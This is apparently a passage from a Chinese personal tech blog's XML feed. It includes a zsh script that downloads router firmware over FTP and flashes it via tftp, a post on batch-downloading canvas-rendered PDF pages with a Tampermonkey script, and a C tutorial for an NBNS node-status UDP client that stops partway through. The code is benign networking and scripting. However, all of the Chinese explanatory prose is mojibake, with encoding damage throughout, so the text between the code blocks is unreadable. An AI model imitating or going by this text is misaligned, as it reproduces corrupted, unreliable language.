<p>çŸ¥é“äº†æ–‡ä»¶åï¼Œå…ˆçœ‹ä¸‹æœ¬åœ°æœ‰æ²¡æœ‰ä¸‹è½½è¿‡ï¼Œå¦‚æœæœ‰åˆ™æ— éœ€é‡å¤ä¸‹è½½ï¼Œå¦‚æœæ²¡æœ‰å°±ä½¿ç”¨<code>lftp</code>çš„<code>get</code>æŒ‡ä»¤ä¸‹è½½åˆ°æœ¬åœ°ã€‚</p>
<pre><code class="zsh"># return if $image already exist in local
[ -f $image ] &amp;&amp; return
[ &quot;x$image&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;no image today&quot; &amp;&amp; exit 1

lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
    cd $dir
    get $image
EOF
</code></pre>
<p>ä»¥ä¸Šå°±å®Œæˆäº†æœ€æ–°imageçš„è·å–ï¼Œç»“åˆä¹‹å‰ä½¿ç”¨<code>tftp</code>çƒ§å½•imageçš„è„šæœ¬ï¼Œæ›´æ–°shellè„šæœ¬å¾—åˆ°ä¸‹é¢çš„å®Œæ•´ä»£ç ã€‚</p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><pre><code class="zsh">#!/bin/zsh
# download image from FTP server and burn it into router with tftp

burn()
{
    tftp 192.168.1.1 &lt;&lt;-EOF &gt; /dev/null
        binary
        put $1
    EOF
}

dl_newest_image()
{
    ftp_user=&quot;username&quot;
    ftp_pass=&quot;password&quot;
    ftp_host=&quot;ftp://1.2.3.4&quot;
    tmpfile=~/tmp/ftp_list

    # get ftp file list of today
    dir=$(date &#39;+%Y%m%d&#39;)
    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF &gt; $tmpfile
        cd $dir
        ls
    EOF

    image=$(tail -1 $tmpfile |awk &#39;{print $4}&#39;)

    # return if $image already exist in local
    [ -f $image ] &amp;&amp; return
    [ &quot;x$image&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;no image today&quot; &amp;&amp; exit 1

    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
        cd $dir
        get $image
    EOF
}


cd $DT/tmp/imgs/ # $DTä»£è¡¨Win10çš„Desktop, æ˜¯æˆ‘.zshrcçš„ä¸€ä¸ªç¯å¢ƒå˜é‡
image=$1

if [ &quot;x$1&quot; = &quot;x&quot;  ]; then
    dl_newest_image
fi

echo &quot;start burning $image&quot;
burn $image
</code></pre>
<h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>ä¸ºäº†æ–¹ä¾¿ï¼Œè„šæœ¬æ–‡ä»¶åæ›´æ–°ä¸º<code>bi</code>, burn imageçš„æ„æ€ï¼Œä½¿ç”¨æ–¹æ³•å«å¸¦å‚å’Œä¸å¸¦å‚ä¸¤ç§ã€‚</p>
<ol>
<li>å¸¦å‚ - çƒ§å½•æŒ‡å®šæ–‡ä»¶</li>
<li>ä¸å¸¦å‚ - ä»FTP serverè·å–æœ€æ–°æ–‡ä»¶å¹¶çƒ§å½•</li>
</ol>
<pre><code class="zsh">âœ  bi 20200430110247-FW-V1.2.1.4.img
start burning 20200430110247-FW-V1.2.1.4.img
âœ  bi
`20200430131128-RBR20-V2.7.1.8RC1-ubi4.img` at 15953920 (45%) 7.41M/s eta:2s [Receiving data]
start burning 20200430131128-RBR20-V2.7.1.8RC1-ubi4.img
</code></pre>
<h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><ol>
<li>å…¶å®ä½¿ç”¨<code>curl</code>ä¹Ÿå¯ä»¥è·å–FTP Serverçš„åˆ—è¡¨ä¿¡æ¯ï¼Œä½¿ç”¨<code>wget</code>ä¹Ÿå¯ä»¥ä¸‹è½½FTP Serveræ–‡ä»¶ï¼Œä½†æ˜¯é‰´äºå…¬å¸ç½‘ç»œä»£ç†ç¯å¢ƒå¤æ‚ï¼Œå®¹æ˜“è«åå¤±è´¥ï¼Œæ‰€ä»¥è¿˜æ˜¯ä½¿ç”¨<code>lftp</code>ï¼›</li>
<li>ç”¨æˆ·åå¯†ç ä¸è¯¥ç›´æ¥æ”¾è„šæœ¬å†…éƒ¨ï¼Œå¯ä»¥å•ç‹¬å­˜åˆ°é…ç½®æ–‡ä»¶å¹¶è®¾ç½®å¥½æƒé™ï¼Œç„¶åè„šæœ¬å»è¯»æ–‡ä»¶ï¼Œå½“ç„¶å•¦ï¼Œç§äººç”µè„‘å¿½ç•¥ï¼›</li>
<li>è„šæœ¬ä¸­<code>&lt;&lt;-EOF</code>çš„<code>-</code>è¡¨ç¤ºå¿½ç•¥ä¸‹é¢è¾“å…¥è¡Œæ¯è¡Œå¼€å§‹çš„tabé”®ï¼Œæ‰€ä»¥è¢«<code>EOF</code>åŒ…å«çš„éƒ¨åˆ†ä¸èƒ½ä½¿ç”¨ç©ºæ ¼é”®æ›¿ä»£tabé”®ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> ftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç®€å•å®ç”¨çš„tftpçƒ§å½•imageè„šæœ¬]]></title>
      <url>https://www.litreily.top/2020/04/27/tftp/</url>
      <content type="html"><![CDATA[<p>çƒ§å½•FW imageæ—¶ï¼Œç»å¸¸éœ€è¦æ‰“å¼€å¸¦æœ‰UIç•Œé¢çš„tftpå®¢æˆ·ç«¯ï¼Œç„¶åè¾“å…¥IPï¼Œé€‰æ‹©FW imageï¼Œç„¶åç‚¹å‡»å†™å…¥ï¼Œå¾ˆæ˜¯ç¹çã€‚</p>
<p>ä¸ºäº†ç®€åŒ–è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘å†³å®šä½¿ç”¨shell scriptï¼Œåœ¨win10ä¸­è‡ªå¸¦WSL(windows subsystem for linux)ï¼Œé…åˆzshé£Ÿç”¨ã€‚</p>
<pre><code class="zsh">#!/bin/zsh
# install to ~/bin/burnImage

[ &quot;x$1&quot; = &quot;x&quot;  ] &amp;&amp; echo &quot;usage: ${0##*/} &lt;imagefile&gt;&quot; &amp;&amp; exit 1

tftp 192.168.1.1 &lt;&lt;-EOF &gt; /dev/null
    binary
    put $1
EOF
</code></pre>
<p>è„šæœ¬ä½¿ç”¨<code>tftp</code>è¿æ¥tftp server 192.168.1.1, ç„¶åè¿›å…¥<code>binary</code>æ¨¡å¼ï¼Œæœ€åå°†imageæ–‡ä»¶<code>$1</code>ä¼ è¾“è‡³serverç«¯ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œä¿è¯è¯¥æ–‡ä»¶<code>burnImage</code>æ‰€åœ¨ç›®å½•åœ¨ç¯å¢ƒå˜é‡<code>$PATH</code>ä¸­ï¼Œä¹‹ååœ¨FW imageæ‰€åœ¨ç›®å½•æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤å®Œæˆçƒ§å½•ï¼Œéå¸¸æ–¹ä¾¿ã€‚</p>
<pre><code class="zsh">burnImage FW.img
</code></pre>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> tftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä½¿ç”¨æ²¹çŒ´è„šæœ¬æ‰¹é‡ä¸‹è½½canvaså›¾ç‰‡]]></title>
      <url>https://www.litreily.top/2020/03/15/canvas-dl/</url>
      <content type="html"><![CDATA[<p>å¥³å‹æœ€è¿‘åœ¨ç½‘ä¸Šä¸‹è½½ä¸€äº›åŒ—å¤§ç½‘ç›˜çš„pdf<a href="https://disk.pku.edu.cn/#/link/3A7748E0466521E3E68A0CBA4C24DE20?gns=AE26ACF837E24D51B1EC40E0A80A5D23%2F7F0E54D7D92343B1B62031B1C41F2280" target="_blank" rel="noopener">æ–‡æ¡£</a>ï¼Œç»“æœå‘ç°æ²¡æœ‰ä¸‹è½½æ¥å£ï¼Œå¦å­˜ä¸ºä¹Ÿåªèƒ½å­˜å‚¨å•å¼ å›¾ç‰‡ã€‚æ‰¾æˆ‘å¸®å¿™ï¼Œè¿™æ—¶å€™å‘ç°ç¨‹åºå‘˜ç”·ç¥¨çš„å¥½å¤„äº†å“ˆã€‚</p>
<h2 id="åˆ†æé¡µé¢"><a href="#åˆ†æé¡µé¢" class="headerlink" title="åˆ†æé¡µé¢"></a>åˆ†æé¡µé¢</h2><p>ä¸€å¼€å§‹æƒ³ç€ä½¿ç”¨Chromeè°ƒè¯•å·¥å…·çœ‹ä¸‹pdfé“¾æ¥ï¼Œå‘ç°è¿™ä¸ªç½‘ç›˜å±…ç„¶ä¸æ˜¯ç›´æ¥è·å–çš„pdfæ–‡ä»¶ï¼Œè€Œæ˜¯ä½¿ç”¨jsè„šæœ¬åŠ¨æ€æ¸²æŸ“ç”Ÿæˆçš„ï¼Œæ¶¨çŸ¥è¯†äº†ã€‚</p>
<p><img src="/assets/canvas/pdf-js.png" alt="pdf-combine js"></p>
<p>é‚£çœ‹çœ‹æ˜¯å¦å¯ä»¥ä»¥å›¾ç‰‡å½¢å¼æ‰¹é‡ä¸‹è½½å‘¢ï¼Œç»“æœæŸ¥çœ‹pdfå•é¡µçš„htmlç»“æ„å‘ç°ï¼Œè¿™å±…ç„¶æ˜¯ä¸ªcanvas!!!è¿˜ä¸æ˜¯æ™®é€šå›¾ç‰‡ï¼Œè€Œæ˜¯ç”»å¸ƒã€‚</p>
<p><img src="/assets/canvas/canvas.png" alt="cancvs"></p>
<h2 id="ä¸‹è½½æ’ä»¶"><a href="#ä¸‹è½½æ’ä»¶" class="headerlink" title="ä¸‹è½½æ’ä»¶"></a>ä¸‹è½½æ’ä»¶</h2><p>æ²¡å…³ç³»ï¼Œcanvasä»€ä¹ˆçš„ä¹Ÿä¸æ˜¯éš¾äº‹ï¼Œä¸‡èƒ½çš„æ²¹çŒ´æ’ä»¶æ€»ä¼šæœ‰è§£å†³æ–¹æ¡ˆçš„ï¼Œæœä¸å…¶ç„¶è®©æˆ‘æ‰¾åˆ°ä¸ªä¸“é—¨ç”¨äºä¸‹è½½svg, canvasçš„æ²¹çŒ´æ’ä»¶â†“</p>
<ul>
<li><a href="https://greasyfork.org/zh-CN/scripts/383101-%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87-%E8%83%8C%E6%99%AF%E5%9B%BE-svg-canvas-%E6%8A%93%E5%8F%96%E9%A2%84%E8%A7%88%E4%B8%8B%E8%BD%BD" target="_blank" rel="noopener">ç½‘ç«™å›¾ç‰‡ï¼ˆèƒŒæ™¯å›¾ï¼Œsvgï¼Œcanvasï¼‰æŠ“å–é¢„è§ˆä¸‹è½½</a></li>
</ul>
<h2 id="ä¸‹è½½å›¾ç‰‡"><a href="#ä¸‹è½½å›¾ç‰‡" class="headerlink" title="ä¸‹è½½å›¾ç‰‡"></a>ä¸‹è½½å›¾ç‰‡</h2><p>è¿™æ­£æ˜¯æˆ‘æƒ³è¦çš„ï¼Œå®‰è£…å¥½åï¼Œä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œåˆ·æ–°è¦ä¸‹è½½canvaså›¾ç‰‡çš„é¡µé¢ï¼Œåœ¨å³ä¸‹è§’æœ‰ä¸€ä¸ªæŒ‰é’®<strong>è‡ªåŠ¨è·å–å›¾ç‰‡</strong>ã€‚</p>
<p><img src="/assets/canvas/check-tampermonkey.png" alt="js extension"></p>
<p>ç‚¹å‡»ä¹‹åå¼€å§‹æ‰«æï¼Œæ³¨æ„ä¸‹å›¾ä¸­çš„æ•°å­—å¹¶ä¸ä»£è¡¨å®é™…çš„å›¾ç‰‡æ•°é‡ï¼Œä¸ç”¨ç†ä¼šã€‚</p>
<p><img src="/assets/canvas/scanning.png" alt="scanning"></p>
<p>æ‰«æå®Œæˆåï¼Œå¯ä»¥é™å®šå›¾ç‰‡å¤§å°ï¼Œä»¥æ»¤é™¤ä¸ç¬¦åˆè¦æ±‚çš„å°å›¾ç‰‡ï¼Œç„¶åé€šè¿‡<strong>æ‰¹é‡ä¸‹è½½</strong>å®Œæˆä¸‹è½½ï¼Œå¯¹äºæ•°é‡è¾ƒå¤šçš„é¡µé¢å¯èƒ½éœ€è¦ç¨å¾®ç­‰ä¸€å°ä¼šï¼Œç»å¤§éƒ¨åˆ†æƒ…å†µæ˜¯å¾ˆå¿«çš„ã€‚</p>
<p><img src="/assets/canvas/download.png" alt="download"></p>
<p>è¿™æ ·å°±ä¸‹è½½å®Œæˆå•¦ã€‚</p>
<p><img src="/assets/canvas/downloaded.png" alt="downloaded"></p>
<p>è‡³äºå¦‚ä½•å°†æ‰¹é‡è½¬æ¢ä¸ºpdfï¼Œé‚£æ–¹æ³•å°±å¤šå•¦ï¼Œç¦æ˜•pdfç¼–è¾‘å™¨ã€ABBYYç­‰ç­‰ï¼Œè¿™ä¸ªç•™å¾…ä¸‹å›å†è®²ï¼Œå“ˆå“ˆã€‚</p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç»è¯„è®ºåŒºå¤§ä½¬@Axunæé†’ï¼Œæœ¬æ–‡æ‰€çˆ¬ç½‘ç«™çš„PDFæ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥æå–çš„ï¼Œåˆ·æ–°é¡µé¢è¿‡æ»¤<code>Access</code>å³å¯å¾—åˆ°ä¸‹é¢çš„é“¾æ¥ï¼Œå³é”®åœ¨æ–°é¡µé¢æ‰“å¼€å³å¯ä¿å­˜ï¼Œç„¶åæ·»åŠ æ‰©å±•åå³å¯ã€‚</p>
<p><img src="/assets/canvas/pdf-source-file.png" alt="PDF source file"></p>
<p>å½“ç„¶å•¦ï¼Œæœ¬æ–‡æåŠçš„canvaså›¾ç‰‡ä¸‹è½½æ–¹æ³•ä¹Ÿé€‚ç”¨äºå…¶å®ƒç½‘ç«™ï¼Œæ¬¢è¿é£Ÿç”¨ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tampermonkey </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NBNSå®¢æˆ·ç«¯çš„Cè¯­è¨€å®ç°]]></title>
      <url>https://www.litreily.top/2020/03/15/nbns_code/</url>
      <content type="html"><![CDATA[<p>æ¥ä¸Šä¸€ç¯‡<a href="/2020/02/28/nbns/">ã€ç½‘ç»œåè®®è¯¦è§£1 - NBNSã€‘</a>å¯¹NBNSçš„ä»‹ç»ï¼Œè¿™ä¸€ç¯‡å°†è¦è®²è¿°ä½¿ç”¨Cè¯­è¨€å¦‚ä½•å®ç°ä¸€ä¸ªNBNSå®¢æˆ·ç«¯ï¼Œç”¨äºå‘å±€åŸŸç½‘å†…å…¶å®ƒè®¾å¤‡å‘é€NBNS NODE STATUS QUERYï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„RESPONSEä¿¡æ¯æ‰“å°å‡ºæ¥ã€‚å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªUDP socketçš„å®ä¾‹ã€‚</p>
<p><img src="/assets/network/udp-socket.png" alt="UDP socket flowchart"></p>
<p>ç¼–å†™ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œé¦–å…ˆè¦æ¸…æ¥šå®ƒè¦å®Œæˆä»€ä¹ˆä»»åŠ¡ï¼Œè¿›è€Œç¡®å®šå®Œæˆä»»åŠ¡çš„æ–¹æ³•å’Œæ­¥éª¤ã€‚å…¶ä»»åŠ¡å¾ˆç®€å•ï¼Œå°±æ˜¯NBNSæ•°æ®åŒ…çš„å‘é€å’Œæ¥æ”¶ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç®€å•çš„socketæ”¶å‘è¿›ç¨‹ã€‚å®ç°ä¸»è¦åˆ†ä»¥ä¸‹å‡ æ­¥ï¼š</p>
<ol>
<li><strong>ç»„åŒ…</strong>å¾—åˆ°NBNS NODE STATUS QUERY</li>
<li>å‘é€NBNS NODE STATUS QUERY</li>
<li>æ¥æ”¶RESPONSEå¹¶è§£æ</li>
</ol>
<h2 id="include-amp-define"><a href="#include-amp-define" class="headerlink" title="include &amp; define"></a>include &amp; define</h2><p>é¦–å…ˆæ¥çœ‹çœ‹ç¼–å†™è¯¥å®¢æˆ·ç«¯ä¼šç”¨åˆ°çš„å¤´æ–‡ä»¶åŠç›¸å…³å®å®šä¹‰</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt; /* for exit */
#include &lt;string.h&gt; /* for memset */
#include &lt;unistd.h&gt; /* for close */
#include &lt;sys/socket.h&gt; /* for socket, bind */
#include &lt;sys/time.h&gt; /* for timeval */
#include &lt;netinet/in.h&gt; /* for socksaddr_in */
#include &lt;arpa/inet.h&gt; /* for htons */

#define NBNS_PORT 137
#define NBNS_TYPE_NB 0x0020
#define NBNS_TYPE_NBSTAT 0x0021
#define NBNS_CLASS_IN 0x0001
#define BUFFER_SIZE 1024 /* buffer size for recv packet */
#define IP_SIZE 16 /* length of IP address like 192.168.1.1 */
</code></pre>
<p>å…³äºNBNSï¼Œå…¶å…¬çŸ¥çš„ç«¯å£å·æ˜¯137ï¼Œåœ¨å‘é€è¯·æ±‚æ—¶ä¼šåœ¨ç›®çš„åœ°å€ä¸­ç”¨åˆ°ã€‚</p>
<h2 id="ç»„åŒ…ç»“æ„ä½“"><a href="#ç»„åŒ…ç»“æ„ä½“" class="headerlink" title="ç»„åŒ…ç»“æ„ä½“"></a>ç»„åŒ…ç»“æ„ä½“</h2><p>æ ¹æ®ä¸Šä¸€ç¯‡çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“NBNS NODE STATUSçš„è¯·æ±‚åŒ…å’Œå“åº”åŒ…çš„æ•°æ®æ ¼å¼ï¼Œæ®æ­¤å¯ä»¥ç¼–å†™ç›¸åº”çš„ç»“æ„ä½“ã€‚</p>
<pre><code class="c">typedef unsigned int uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;

struct nbns_header {
    uint16 tid; /* Transaction ID */
    uint16 flags;
    uint16 question;
    uint16 answer;
    uint16 authority;
    uint16 additional;
} __attribute__ ((packed));

// NBNS NODE STATUS QUERY FORMAT
struct nbns_request {
    struct nbns_header header;

    char qname[34];
    uint16 qtype;
    uint16 qclass;
} __attribute__ ((packed));

struct nbns_name {
    char name[16];
    uint16 flags;
} __attribute__ ((packed));

// NBNS NODE STATUS RESPONSE FORMAT
struct nbns_response_header {
    struct nbns_header header;

    char rname[34];
    uint16 rtype;
    uint16 rclass;

    uint32 ttl;
    uint16 length;
    uint8 num_of_names;
} __attribute__ ((packed));
</code></pre>
<p>æ³¨æ„æ¯ä¸ªç»“æ„ä½“åçš„<code>__attribute__ ((packed))</code>ï¼Œè¿™æ˜¯ä¸ºäº†å‘Šè¯‰ç¼–è¯‘å™¨ä¸è¦å¯¹å…¶è¿›è¡Œå¯¹é½ä¼˜åŒ–ï¼Œä¿æŒæ•°æ®çš„ç´§å‡‘æ€§ï¼Œä»¥é˜²æ•°æ®è§£æå‡ºé”™ã€‚</p>
<h2 id="åç§°ç¼–è§£ç "><a href="#åç§°ç¼–è§£ç " class="headerlink" title="åç§°ç¼–è§£ç "></a>åç§°ç¼–è§£ç </h2><p>åœ¨è¿›å…¥æ­£é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹NetBIOSåç§°çš„ç¼–è§£ç ï¼Œè¿™åœ¨åç»­å‘é€è¯·æ±‚å’Œè§£æå“åº”ä¸­éƒ½ä¼šç”¨åˆ°ã€‚ä»RFC1001å¯çŸ¥ï¼ŒNBNSè¯·æ±‚åŒ…ä¸­çš„Nameæ˜¯è¢«ç¼–ç çš„ï¼Œåœ¨<a href="/2020/02/28/nbns/#NetBIOS-å‘½åç¼–ç ">ä¸Šä¸€ç¯‡</a>ä¸­å·²ç»è®²è¿°è¿‡äº†ã€‚</p>
<h3 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h3><p>å¯¹äºNODE STATUS QUERY, é€šå¸¸å°†NBNS nameè®¾ä¸º<code>*</code>, å°±æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œä½¿ç”¨ä¸‹é¢çš„å‡½æ•°å¯ä»¥å¯¹å…¶ç¼–ç ã€‚</p>
<pre><code class="c">// encode &quot;*&quot; to &quot;CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
void encode_name(char *name)
{
    int i;

    name[0] = 0x20; /* length of name */
    name[1] = ((&#39;*&#39; &gt;&gt; 4) &amp; 0x0F) + &#39;A&#39;;
    name[2] = (&#39;*&#39; &amp; 0x0F) + &#39;A&#39;;

    for (i = 3; i &lt; 33; i++)
        name[i] = &#39;A&#39;;

    name[i] = &#39;\0&#39;; /* end of name */
}
</code></pre>
<h3 id="è§£ç "><a href="#è§£ç " class="headerlink" title="è§£ç "></a>è§£ç </h3><p>è§£ç ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç¼–ç çš„é€†è¿‡ç¨‹ã€‚ä¸Šé¢çš„ç¼–ç å‡½æ•°åªé’ˆå¯¹<code>*</code>ï¼Œä½†è¿™é‡Œçš„è§£ç å‡½æ•°å´æ˜¯é’ˆå¯¹æ‰€æœ‰æ»¡è¶³æ ¼å¼è¦æ±‚çš„å­—ç¬¦ä¸²ã€‚</p>
<pre><code class="c">void decode_name(char *name, char *dst)
{
    int i;

    if (name[0] != 0x20)
        return;
    for (i = 1; i &lt; 0x20; i+=2)
        dst[i/2] = (((name[i]-&#39;A&#39;) &lt;&lt; 4) &amp; 0xF0) + ((name[i+1]-&#39;A&#39;) &amp; 0x0F);  
    dst[i/2] = &#39;\0&#39;;
}
</code></pre>
<h2 id="create-socket"><a href="#create-socket" class="headerlink" title="create socket"></a>create socket</h2><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>å¥½äº†ï¼Œè¿›å…¥æ­£é¢˜ã€‚åœ¨æ‰§è¡Œæ•°æ®æ”¶å‘ä¹‹å‰éœ€è¦åˆ›å»ºUDP socket, è¿™é‡Œä¼šç”¨åˆ°socketå‡½æ•°ã€‚</p>
<pre><code class="c">#include &lt;sys/socket.h&gt;

int socket(int domain, int type, int protocol);

RETURN VALUE
       On success, a file descriptor for the new socket is returned.  
       On error, -1 is returned, and errno is set appropriately.
</code></pre>
<p>ä¸‹é¢ç®€è¦ä»‹ç»ä¸‹ç›¸å…³å‚æ•°ã€‚</p>
<ul>
<li><p>domain<br>å¸¸è§çš„ç½‘ç»œé€šä¿¡åŸŸdomainä¸»è¦æœ‰<code>AF_UNIX</code>, <code>AF_INET</code>, <code>AF_INET6</code>, <code>AF_NETLINK</code>ï¼Œå¯¹äºå¸¸è§çš„TCP/UDPä¼ è¾“ï¼ŒåŸºäºIPv4åè®®ï¼Œæˆ‘ä»¬é€‰æ‹©<code>AF_INET</code>å³å¯ã€‚</p>
</li>
<li><p>type<br>typeä»£è¡¨socketç±»å‹ï¼Œå¸¸ç”¨çš„åŒ…å«é’ˆå¯¹TCPçš„<code>SOCK_STREAM</code>ã€é’ˆå¯¹UDPçš„<code>SOCK_DGRAM</code>ï¼Œä»¥åŠé’ˆå¯¹éœ€è¦è®¿é—®æºç½‘ç»œæ•°æ®ï¼ˆåº”ç”¨å±‚ä»¥ä¸‹æ•°æ®ï¼‰çš„<code>SOCK_RAW</code>ã€‚æ˜¾ç„¶æœ¬æ–‡ä½¿ç”¨çš„æ˜¯<code>SOCK_DGRAM</code>.</p>
</li>
<li><p>protocol<br>protocolé€šå¸¸è®¾ä¸º0ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é’ˆå¯¹åè®®è¿›è¡Œé…ç½®ï¼Œæ¯”å¦‚UDPå¯¹åº”çš„<code>IPPROTO_UDP</code>ï¼Œå…¶ä¸­IPPROTOæ˜¯IP Protocolçš„ç¼©å†™ã€‚</p>
</li>
</ul>
<h3 id="åˆ›å»ºsocket"><a href="#åˆ›å»ºsocket" class="headerlink" title="åˆ›å»ºsocket"></a>åˆ›å»ºsocket</h3><p>ä¸‹é¢æ¥å®ç°ä¸€ä¸ªopen_socketå‡½æ•°ï¼Œç”¨äºæ‰“å¼€ä¸€ä¸ªsocketï¼Œå¯ä»¥æŠŠå®ƒå½“åšä¸€ä¸ªä¿¡å°ï¼Œç­‰å¾…åé¢å†™å¥½ä¿¡ä»¶æ”¾è¿›å»ã€‚</p>
<pre><code class="c">int open_socket(void)
{
    int sock;
    struct sockaddr_in saddr;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock &lt; 0)
        handle_error(&quot;socket&quot;);

    memset(&amp;saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = 0;
    saddr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sock, (struct sockaddr *)&amp;saddr, sizeof(saddr)) == -1)
        handle_error(&quot;bind&quot;);

    return sock;
}
</code></pre>
<p>è¿™é‡Œè¦æ³¨æ„å‡ ç‚¹ï¼š</p>
<ol>
<li>ç½‘ç»œå­—èŠ‚åºå’Œä¸»æœºå­—èŠ‚åºä¸ä¸€å®šä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨<code>htonl</code>, <code>htons</code>å‡½æ•°è¿›è¡Œè½¬æ¢<ul>
<li>h - host</li>
<li>n - network</li>
<li>s - short 2ä¸ªå­—èŠ‚</li>
<li>l - long 4ä¸ªå­—èŠ‚</li>
</ul>
</li>
<li>æºåœ°å€çš„ç«¯å£portè®¾ä¸º0ï¼Œä»£è¡¨ç”±ç½‘ç»œåè®®æ ˆåˆ†é…</li>
<li>bindå‡½æ•°ç”¨äºç»‘å®šå‘é€åœ°å€ï¼Œç±»ä¼¼äºå¾€ä¿¡å°ä¸Šå†™å¥½å¯„ä¿¡äººçš„åœ°å€ä¿¡æ¯</li>
<li>handle_erroræ˜¯ä¸€ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ£€æµ‹åˆ°é”™è¯¯åè°ƒç”¨å…¶æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºã€‚</li>
</ol>
<h2 id="å‘é€è¯·æ±‚"><a href="#å‘é€è¯·æ±‚" class="headerlink" title="å‘é€è¯·æ±‚"></a>å‘é€è¯·æ±‚</h2><h3 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h3><p>å‘é€å‡½æ•°åŒ…æ‹¬ç»„åŒ…å’Œå‘é€ä¸¤éƒ¨åˆ†ï¼Œå°†è¯·æ±‚ä¿¡æ¯æŒ‰ç…§ç»„åŒ…æ ¼å¼é€ä¸€èµ‹å€¼ï¼Œç„¶åé€šè¿‡<code>sendto</code>å‘é€æ•°æ®åŒ…ã€‚</p>
<pre><code class="c">#include &lt;sys/socket.h&gt;

ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
               const struct sockaddr *dest_addr, socklen_t addrlen);

RETURN VALUE
       On success, these calls return the number of bytes sent.
       On error, -1 is returned, and errno is set appropriately.
</code></pre>
<p>å‘é€æˆåŠŸåˆ™è¿”å›çœŸå®çš„å‘é€å­—èŠ‚æ•°ï¼Œå¦åˆ™è¿”å›-1å¹¶æ›´æ–°errno.</p>
<h3 id="å‘é€æ•°æ®"><a href="#å‘é€æ•°æ®" class="headerlink" title="å‘é€æ•°æ®"></a>å‘é€æ•°æ®</h3><pre><code class="c">int send_nbns_query(int sock, struct in_addr dest_ip)
{
    struct sockaddr_in dest;
    struct nbns_request req;

    memset(&amp;dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(NBNS_PORT);
    dest.sin_addr = dest_ip;

    req.header.tid = htons(1);
    req.header.flags = htons(0x0000);
    req.header.question = htons(1);
    req.header.answer = 0;
    req.header.authority = 0;
    req.header.additional = 0;
    encode_name(req.qname);
    req.qtype = htons(NBNS_TYPE_NBSTAT);
    req.qclass = htons(NBNS_CLASS_IN);

    return sendto(sock, (char *)&amp;req, sizeof(req), 0,
           (struct sockaddr *)&amp;dest, sizeof(dest));
}
</code></pre>
<p>æ³¨æ„ï¼Œé™¤äº†0ã€å•å­—èŠ‚æ•°æ®ã€å•å­—èŠ‚æ•°ç»„å¤–ï¼Œå…¶ä½™æ•°æ®éƒ½éœ€è¦ä½¿ç”¨<code>htons</code>æˆ–<code>htonl</code>è¿›è¡Œè½¬æ¢ï¼Œå°†ä¸»æœºå­—èŠ‚åºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºã€‚</p>
<h2 id="æ¥æ”¶å“åº”"><a href="#æ¥æ”¶å“åº”" class="headerlink" title="æ¥æ”¶å“åº”"></a>æ¥æ”¶å“åº”</h2><h3 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h3><p>å‘é€è¯·æ±‚åï¼Œä¾¿å¯ä»¥ä½¿ç”¨<code>recvfrom</code>å‡½æ•°æ¥æ”¶å“åº”æ•°æ®äº†ã€‚</p>
<pre><code class="c">#include &lt;sys/socket.h&gt;

ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
                 struct sockaddr *src_addr, socklen_t *addrlen);

RETURN VALUE
    These calls return the number of bytes received, or -1 if an error occurred.
